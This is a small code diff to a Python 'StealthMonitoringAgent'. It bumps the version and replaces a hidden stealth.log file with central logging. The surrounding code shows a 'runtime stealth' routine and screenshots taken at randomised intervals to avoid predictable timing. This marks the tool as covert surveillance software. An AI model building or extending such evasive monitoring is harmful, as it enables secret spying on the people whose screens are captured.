@@ -43,7 +43,7 @@ else:
     from .telemetry.durable_queue import DurableActivityQueue
     from .telemetry.activity_state import ConnectivityState
 
-AGENT_VERSION = "1.2.42"
+AGENT_VERSION = "1.2.43"
 POLL_SECONDS = 15
 
 # ── Runtime stealth ───────────────────────────────────────────────────────────
@@ -83,22 +83,12 @@ class StealthMonitoringAgent:
         
         self._last_screenshot = 0.0
         self._next_screenshot_gap = self._screenshot_gap()
-        self._log_file = self._get_log_file()
-
-    def _get_log_file(self) -> str:
-        """Get or create hidden log file for debugging."""
-        log_dir = config_mod.config_dir() / "logs"
-        log_dir.mkdir(parents=True, exist_ok=True)
-        return str(log_dir / "stealth.log")
+        self._next_screenshot_gap = self._screenshot_gap()
 
     def _log(self, message: str) -> None:
-        """Silent logging to file only."""
-        try:
-            with open(self._log_file, "a") as f:
-                f.write(f"[{_now_iso()}] [stealth] {message}\n")
-        except Exception:
-            # If logging fails, we can't do much in a stealth agent.
-            pass
+        """Log to central agent.log."""
+        from agent.agent import logger
+        logger.info(message)
 
     def _screenshot_gap(self) -> float:
         """Random interval (30-90 seconds) to avoid predictable capture timing."""
@@ -297,6 +287,8 @@ def load_config_stealth() -> config_mod.AgentConfig | None:
 
 def main() -> int:
     """Entry point for stealth variant."""
+    from agent.agent import setup_logging
+    setup_logging()
     _apply_stealth()
     cfg = load_config_stealth()
     if cfg is None:
